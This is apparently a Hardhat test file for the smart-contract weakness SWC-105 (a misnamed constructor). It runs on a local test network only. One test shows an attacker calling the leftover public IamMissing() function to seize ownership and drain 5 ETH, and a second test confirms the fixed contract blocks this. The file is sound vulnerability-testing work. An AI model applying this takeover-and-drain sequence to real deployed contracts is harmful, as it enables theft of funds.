const { expect } = require("chai");
const { ethers } = require("hardhat");

// SWC-105 — a misnamed constructor left as a callable public function.
describe("Missing / wrong constructor name (SWC-105)", function () {
  it("VULNERABLE: attacker calls IamMissing(), seizes ownership, drains funds", async function () {
    const [deployer, attacker] = await ethers.getSigners();
    const F = await ethers.getContractFactory("contracts/vulnerable/Missing.sol:Missing");
    const c = await F.deploy();
    await c.waitForDeployment();
    const addr = await c.getAddress();

    // Fund the contract (payable fallback).
    await deployer.sendTransaction({ to: addr, value: ethers.parseEther("5") });

    // Attack: become owner, then withdraw.
    await c.connect(attacker).IamMissing();
    const before = await ethers.provider.getBalance(attacker.address);
    const tx = await c.connect(attacker).withdraw();
    const rcpt = await tx.wait();
    const after = await ethers.provider.getBalance(attacker.address);

    expect(await ethers.provider.getBalance(addr)).to.equal(0n);
    // Attacker is richer by ~5 ETH minus gas.
    expect(after - before + rcpt.gasUsed * rcpt.gasPrice).to.be.greaterThan(
      ethers.parseEther("4.9")
    );
  });

  it("FIXED: no public initialiser exists, and non-owner withdraw reverts", async function () {
    const [deployer, attacker] = await ethers.getSigners();
    const F = await ethers.getContractFactory("contracts/fixed/Missing.sol:Missing");
    const c = await F.deploy();
    await c.waitForDeployment();
    const addr = await c.getAddress();
    await deployer.sendTransaction({ to: addr, value: ethers.parseEther("5") });

    // The IamMissing() entry point no longer exists in the ABI.
    expect(c.interface.hasFunction("IamMissing")).to.equal(false);
    // Attacker can never become owner, so withdraw is denied.
    await expect(c.connect(attacker).withdraw()).to.be.reverted;
  });
});
